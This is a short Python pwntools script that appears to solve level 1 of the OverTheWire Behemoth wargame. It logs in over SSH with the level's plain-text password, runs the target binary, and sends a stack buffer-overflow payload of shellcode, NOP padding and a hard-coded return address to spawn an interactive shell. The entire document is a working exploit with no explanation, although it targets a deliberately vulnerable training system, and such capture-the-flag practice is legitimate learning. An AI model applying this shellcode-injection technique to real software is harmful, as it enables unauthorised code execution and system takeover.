from pwn import *

host = "behemoth.labs.overthewire.org"
user = "behemoth1"
password = "aesebootiv"
binary = "/games/behemoth/behemoth1"
shell = ssh(host=host, user=user, password=password)
r = shell.run(binary)

ret = p32(0xffffdded)
payload = "\x09"*4+asm(shellcraft.sh())
payload += '\x90'*(79-len(payload))
payload += ret

r.sendline(payload)
r.interactive()
